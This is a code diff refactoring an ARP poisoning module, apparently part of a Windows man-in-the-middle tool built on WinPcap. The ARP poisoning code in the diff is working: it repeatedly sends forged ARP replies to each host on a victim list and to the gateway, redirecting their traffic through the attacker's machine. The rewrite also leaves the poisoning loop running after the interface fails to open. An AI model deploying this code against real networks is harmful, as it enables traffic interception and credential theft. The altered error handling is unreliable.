@@ -10,22 +10,19 @@
 #include "ArpPoisoning.h"
 #include "LinkedListSystems.h"
 #include "Logging.h"
-#include "NetworkFunctions.h"
+#include "NetworkHelperFunctions.h"
 
 
 extern int gDEBUGLEVEL;
 extern PSYSNODE gSystemsList;
 
 
-/*
- * 
- *
- */
-DWORD WINAPI StartArpPoisoning(LPVOID scanParamsParam)
+
+DWORD WINAPI ArpPoisoningLoop(LPVOID scanParamsParam)
 {
   int retVal = 0;
   int roundCounter = 0;
-  PSCANPARAMS tmpParams = (PSCANPARAMS) scanParamsParam;
+  PSCANPARAMS tmpParams = (PSCANPARAMS)scanParamsParam;
   SCANPARAMS scanParams;
   ArpPacket arpPacket;
   unsigned char *date = NULL;
@@ -39,85 +36,84 @@ DWORD WINAPI StartArpPoisoning(LPVOID scanParamsParam)
   char tempBuffer[PCAP_ERRBUF_SIZE];
   SYSTEMNODE systemList[MAX_SYSTEMS_COUNT];
 
-  LogMsg(DBG_LOW, "StartArpPoisoning(): Starting");
 
   ZeroMemory(&scanParams, sizeof(scanParams));
   CopyMemory(&scanParams, tmpParams, sizeof(scanParams));
 
 
   // Open interface.
-  if ((scanParams.InterfaceWriteHandle = pcap_open((char *) scanParams.InterfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS|PCAP_OPENFLAG_PROMISCUOUS, PCAP_READTIMEOUT, NULL, tempBuffer)) != NULL)
+  LogMsg(DBG_LOW, "ArpPoisoningLoop(): Starting");
+  if ((scanParams.InterfaceWriteHandle = pcap_open((char *)scanParams.InterfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL | PCAP_OPENFLAG_MAX_RESPONSIVENESS | PCAP_OPENFLAG_PROMISCUOUS, PCAP_READTIMEOUT, NULL, tempBuffer)) == NULL)
   {
-    // Send poisoned packets to all systems in the "victim list"
-    while (1)
+    LogMsg(DBG_ERROR, "ArpPoisoningLoop(): pcap_open() failed (%s)", tempBuffer);
+  }
+
+  // Send poisoned packets to all systems in the "victim list"
+  while (1)
+  {
+    LogMsg(DBG_LOW, "ArpPoisoningLoop(): ARP Poisoning round %d", roundCounter);
+    ZeroMemory(systemList, sizeof(systemList));
+
+    if ((numberSystems = GetListCopy(gSystemsList, systemList)) > 0)
     {
-      LogMsg(DBG_LOW, "StartArpPoisoning(): Poisoning round %d", roundCounter);
-      ZeroMemory(systemList, sizeof(systemList));
+      LogMsg(DBG_LOW, "ArpPoisoningLoop(): New ARP poisoning round with %d system(s)", numberSystems);
 
-
-      if ((numberSystems = GetListCopy(gSystemsList, systemList)) > 0)
+      // Iterate through all systems
+      for (counter = 0; counter < numberSystems && counter < MAX_SYSTEMS_COUNT; counter++)
       {
-        LogMsg(DBG_LOW, "StartArpPoisoning(): New Round with %d system(s)", numberSystems);
+        LogMsg(DBG_LOW, "ArpPoisoningLoop(): #%i: %s -> %02x-%02x-%02x-%02x-%02x-%02x", counter, systemList[counter].sysIpStr,
+          systemList[counter].sysMacBin[0],
+          systemList[counter].sysMacBin[1],
+          systemList[counter].sysMacBin[2],
+          systemList[counter].sysMacBin[3],
+          systemList[counter].sysMacBin[4],
+          systemList[counter].sysMacBin[5]
+        );
 
-        // Iterate through all systems
-        for (counter = 0; counter < numberSystems && counter < MAX_SYSTEMS_COUNT; counter++)
+        // Dont poison the GW with a new MAC.
+        if (memcmp(systemList[counter].sysIpBin, scanParams.GatewayIpBin, BIN_IP_LEN) == 0)
         {
-          LogMsg(DBG_LOW, "StartArpPoisoning(): #%i: %s -> %02x-%02x-%02x-%02x-%02x-%02x", counter, systemList[counter].sysIpStr,
-            systemList[counter].sysMacBin[0],
-            systemList[counter].sysMacBin[1],
-            systemList[counter].sysMacBin[2],
-            systemList[counter].sysMacBin[3],
-            systemList[counter].sysMacBin[4],
-            systemList[counter].sysMacBin[5]
-          );
-          // Dont poison the GW with a new MAC.
-          if (memcmp(systemList[counter].sysIpBin, scanParams.GatewayIpBin, BIN_IP_LEN) == 0) 
-          {
-            continue;
-          }
-          else if (systemList[counter].sysIpStr != NULL && strnlen((char *) systemList[counter].sysIpStr, MAX_IP_LEN) > 0 && systemList[counter].sysMacBin != NULL)
-          {
-            // Prepare the poisoning ARP Reply packet.
-            SendArpPoison(&scanParams, systemList[counter].sysMacBin, systemList[counter].sysIpBin);
+          continue;
+        }
+        else if (systemList[counter].sysIpStr != NULL && strnlen((char *)systemList[counter].sysIpStr, MAX_IP_LEN) > 0 && systemList[counter].sysMacBin != NULL)
+        {
+          // Prepare the poisoning ARP Reply packet.
+          SendArpPoison(&scanParams, systemList[counter].sysMacBin, systemList[counter].sysIpBin);
 
+          /*
+           * HACK : No clue how this can happen!! Sometimes ARP requests
+           * destined for our own system dont arrive :/
+           * We have to send back our MAC/IP to all victims manually
+           */
+          ZeroMemory(&arpPacket, sizeof(arpPacket));
+          arpPacket.lReqType = ARP_REPLY;
+          CopyMemory(arpPacket.EthSrcMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
+          CopyMemory(arpPacket.ArpLocalMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
+          CopyMemory(arpPacket.EthDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);
+          CopyMemory(arpPacket.ArpDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);
 
-            /*
-             * HACK : No clue how this can happen!! Sometimes ARP requests
-             * destined for our own system dont arrive :/ 
-             * We have to send back our MAC/IP to all victims manually
-             */
-            ZeroMemory(&arpPacket, sizeof(arpPacket));
-            arpPacket.lReqType = ARP_REPLY;
-            CopyMemory(arpPacket.EthSrcMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
-            CopyMemory(arpPacket.ArpLocalMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
-            CopyMemory(arpPacket.EthDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);
-            CopyMemory(arpPacket.ArpDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);
+          CopyMemory(arpPacket.ArpLocalIpBin, scanParams.LocalIpBin, BIN_IP_LEN);
+          CopyMemory(arpPacket.ArpDstIpBin, systemList[counter].sysIpBin, BIN_IP_LEN);
 
-            CopyMemory(arpPacket.ArpLocalIpBin, scanParams.LocalIpBin, BIN_IP_LEN);
-            CopyMemory(arpPacket.ArpDstIpBin, systemList[counter].sysIpBin, BIN_IP_LEN);
+          SendArpPacket((pcap_t *)scanParams.InterfaceWriteHandle, &arpPacket);
 
-            SendArpPacket((pcap_t *) scanParams.InterfaceWriteHandle, &arpPacket);
-
-            roundCounter++;
-            Sleep(SLEEP_BETWEEN_ARPS);
-          }
-          else
-          {
-            LogMsg(DBG_ERROR, "StartArpPoisoning(): Target array issue.");
-            break;
-          }
+          roundCounter++;
+          Sleep(SLEEP_BETWEEN_ARPS);
+        }
+        else
+        {
+          LogMsg(DBG_ERROR, "ArpPoisoningLoop(): Target array issue.");
+          break;
         }
       }
-
-      Sleep(SLEEP_BETWEEN_REPOISONING);
     }
-  }
-  else
-  {
-    LogMsg(DBG_ERROR, "StartArpPoisoning(): pcap_open() failed (%s)", tempBuffer);
+
+    Sleep(SLEEP_BETWEEN_REPOISONING);
   }
 
-  LogMsg(DBG_LOW, "StartArpPoisoning(): exit");
+END:
+
+  LogMsg(DBG_LOW, "ArpPoisoningLoop(): exit");
 
   return retVal;
 }
@@ -135,81 +131,90 @@ int SendArpPoison(PSCANPARAMS scanParamsParam, unsigned char victimMacBinParam[B
 {
   int retVal = OK;
   ArpPacket arpPacket;
-  char victimIpStr[MAX_BUF_SIZE+1];
-  char victimMacStr[MAX_BUF_SIZE+1];
-  char localIpStr[MAX_BUF_SIZE+1];
-  char localMacStr[MAX_BUF_SIZE+1];
-  char gatewayIpStr[MAX_BUF_SIZE+1];
-  char gatewayMacStr[MAX_BUF_SIZE+1];
+  char victimIpStr[MAX_BUF_SIZE + 1];
+  char victimMacStr[MAX_BUF_SIZE + 1];
+  char localIpStr[MAX_BUF_SIZE + 1];
+  char localMacStr[MAX_BUF_SIZE + 1];
+  char gatewayIpStr[MAX_BUF_SIZE + 1];
+  char gatewayMacStr[MAX_BUF_SIZE + 1];
 
 
-  if (scanParamsParam != NULL && scanParamsParam->InterfaceWriteHandle != NULL)
+  if (scanParamsParam == NULL || scanParamsParam->InterfaceWriteHandle == NULL)
   {
-    if (memcmp(victimMacBinParam, scanParamsParam->GatewayMacBin, BIN_MAC_LEN) != 0)
-    {
-      ZeroMemory(victimIpStr, sizeof(victimIpStr));
-      ZeroMemory(victimMacStr, sizeof(victimMacStr));
-      ZeroMemory(localIpStr, sizeof(localIpStr));
-      ZeroMemory(localMacStr, sizeof(localMacStr));
-      ZeroMemory(gatewayIpStr, sizeof(gatewayIpStr));
-      ZeroMemory(gatewayMacStr, sizeof(gatewayMacStr));
-
-      IpBin2String(victimIpBinParam, (unsigned char *) victimIpStr, sizeof(victimIpStr));
-      IpBin2String(scanParamsParam->LocalIpBin, (unsigned char *) localIpStr, sizeof(localIpStr));
-      IpBin2String(scanParamsParam->GatewayIpBin , (unsigned char *) gatewayIpStr, sizeof(gatewayIpStr));
-
-      MacBin2String(victimMacBinParam, (unsigned char *) victimMacStr, sizeof(victimMacStr));
-      MacBin2String(scanParamsParam->LocalMacBin , (unsigned char *) localMacStr, sizeof(localMacStr));
-      MacBin2String(scanParamsParam->GatewayMacBin , (unsigned char *) gatewayMacStr, sizeof(gatewayMacStr));
-
-      LogMsg(DBG_ERROR, "Poisoning  %s/%s <--> %s/%s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
-
-      // Poisoning from A to B.
-      ZeroMemory(&arpPacket, sizeof(arpPacket));
-
-      arpPacket.lReqType = ARP_REPLY;
-      // Set MAC values
-      CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
-      CopyMemory(arpPacket.EthDstMacBin, victimMacBinParam, BIN_MAC_LEN);
-
-      // Set ARP reply values
-      CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
-      CopyMemory(arpPacket.ArpLocalIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);
-
-      CopyMemory(arpPacket.ArpDstMacBin, victimMacBinParam, BIN_MAC_LEN);
-      CopyMemory(arpPacket.ArpDstIpBin, victimIpBinParam, BIN_IP_LEN);
-      //printf("Poison(1) %s/%s    %s/%s -> %s/%s\n", lLocalMAC, lVicMAC, lLocalMAC, lGWIP, lVicMAC, lVicIP);
-
-      // Send packet
-      if (SendArpPacket((pcap_t *) scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
-      {
-        LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet A2B");
-        retVal = NOK;
-      }
-
-      // Poisoning from B to A.
-      ZeroMemory(&arpPacket, sizeof(arpPacket));
-
-      arpPacket.lReqType = ARP_REPLY;
-      // Set MAC values
-      CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
-      CopyMemory(arpPacket.EthDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);
-
-      // Set ARP reply values
-      CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
-      CopyMemory(arpPacket.ArpLocalIpBin, victimIpBinParam, BIN_IP_LEN);
-
-      CopyMemory(arpPacket.ArpDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);
-      CopyMemory(arpPacket.ArpDstIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);
-
-      // Send packet
-      if (SendArpPacket((pcap_t *) scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
-      {
-        LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet B2A");
-        retVal = NOK;
-      }
-    }
+    retVal = NOK;
+    goto END;
   }
+
+  if (memcmp(victimMacBinParam, scanParamsParam->GatewayMacBin, BIN_MAC_LEN) == 0)
+  {
+    retVal = NOK;
+    goto END;
+  }
+
+  ZeroMemory(victimIpStr, sizeof(victimIpStr));
+  ZeroMemory(victimMacStr, sizeof(victimMacStr));
+  ZeroMemory(localIpStr, sizeof(localIpStr));
+  ZeroMemory(localMacStr, sizeof(localMacStr));
+  ZeroMemory(gatewayIpStr, sizeof(gatewayIpStr));
+  ZeroMemory(gatewayMacStr, sizeof(gatewayMacStr));
+
+  IpBin2String(victimIpBinParam, (unsigned char *)victimIpStr, sizeof(victimIpStr));
+  IpBin2String(scanParamsParam->LocalIpBin, (unsigned char *)localIpStr, sizeof(localIpStr));
+  IpBin2String(scanParamsParam->GatewayIpBin, (unsigned char *)gatewayIpStr, sizeof(gatewayIpStr));
+
+  MacBin2String(victimMacBinParam, (unsigned char *)victimMacStr, sizeof(victimMacStr));
+  MacBin2String(scanParamsParam->LocalMacBin, (unsigned char *)localMacStr, sizeof(localMacStr));
+  MacBin2String(scanParamsParam->GatewayMacBin, (unsigned char *)gatewayMacStr, sizeof(gatewayMacStr));
+
+  LogMsg(DBG_ERROR, "Poisoning  %s/%s <--> %s/%s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
+
+  // Poisoning from A to B.
+  ZeroMemory(&arpPacket, sizeof(arpPacket));
+
+  arpPacket.lReqType = ARP_REPLY;
+  // Set MAC values
+  CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
+  CopyMemory(arpPacket.EthDstMacBin, victimMacBinParam, BIN_MAC_LEN);
+
+  // Set ARP reply values
+  CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
+  CopyMemory(arpPacket.ArpLocalIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);
+
+  CopyMemory(arpPacket.ArpDstMacBin, victimMacBinParam, BIN_MAC_LEN);
+  CopyMemory(arpPacket.ArpDstIpBin, victimIpBinParam, BIN_IP_LEN);
+  //printf("Poison(1) %s/%s    %s/%s -> %s/%s\n", lLocalMAC, lVicMAC, lLocalMAC, lGWIP, lVicMAC, lVicIP);
+
+  // Send packet
+  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
+  {
+    LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet A2B");
+    retVal = NOK;
+  }
+
+  // Poisoning from B to A.
+  ZeroMemory(&arpPacket, sizeof(arpPacket));
+
+  arpPacket.lReqType = ARP_REPLY;
+  // Set MAC values
+  CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
+  CopyMemory(arpPacket.EthDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);
+
+  // Set ARP reply values
+  CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
+  CopyMemory(arpPacket.ArpLocalIpBin, victimIpBinParam, BIN_IP_LEN);
+
+  CopyMemory(arpPacket.ArpDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);
+  CopyMemory(arpPacket.ArpDstIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);
+
+  // Send packet
+  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
+  {
+    LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet B2A");
+    retVal = NOK;
+  }
+
+
+END:
 
   return retVal;
 }
@@ -221,9 +226,9 @@ int SendArpPacket(void *interfaceHandleParam, PArpPacket arpPacketParam)
   int retVal = NOK;
   unsigned char arpPacket[sizeof(ETHDR) + sizeof(ARPHDR)];
   int counter = 0;
-  PETHDR ethrHdrPtr = (PETHDR) arpPacket;
-  PARPHDR arpHdrPtr = (PARPHDR) (arpPacket + 14);
-  
+  PETHDR ethrHdrPtr = (PETHDR)arpPacket;
+  PARPHDR arpHdrPtr = (PARPHDR)(arpPacket + 14);
+
   ZeroMemory(arpPacket, sizeof(arpPacket));
 
   // Layer 1/2 (Physical)
@@ -251,7 +256,11 @@ int SendArpPacket(void *interfaceHandleParam, PArpPacket arpPacketParam)
   }
   else
   {
-    LogMsg(DBG_ERROR, "SendARPPacket(): Error occured while sending the packet: %s", pcap_geterr(interfaceHandleParam));
+    //char *errorMsg = pcap_geterr(interfaceHandleParam);
+    //if (errorMsg == NULL)
+    //  errorMsg = "WinPcap error unknown";
+
+    LogMsg(DBG_ERROR, "SendARPPacket(): Error occured while sending the packet");
   }
 
   return retVal;
